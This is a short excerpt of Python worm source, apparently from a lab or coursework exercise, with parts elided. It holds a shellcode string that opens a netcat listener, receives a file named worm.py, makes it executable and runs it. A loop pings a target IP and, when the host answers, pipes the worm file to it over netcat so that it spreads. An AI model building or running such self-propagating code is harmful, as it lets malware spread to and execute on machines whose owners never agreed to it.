...
shellcode= (
   ...
   " echo '(^_^) Shellcode is running (^_^)'; touch worm.py;    "
   " nc -lnv 8080 > worm.py; chmod +x worm.py; python3 worm.py;pwd;    "
   "                                                           *"
...
while True:
    ...
    response = os.popen(f"ping -c1 {targetIP}").read()
    ...
    if "1 received" in response:
    	...
    	#run server to send file
    	path = os.getcwd() + "/worm.py"
    	subprocess.call(["cat "+ path + f" | nc -w3 {targetIP} 8080"], shell=True)
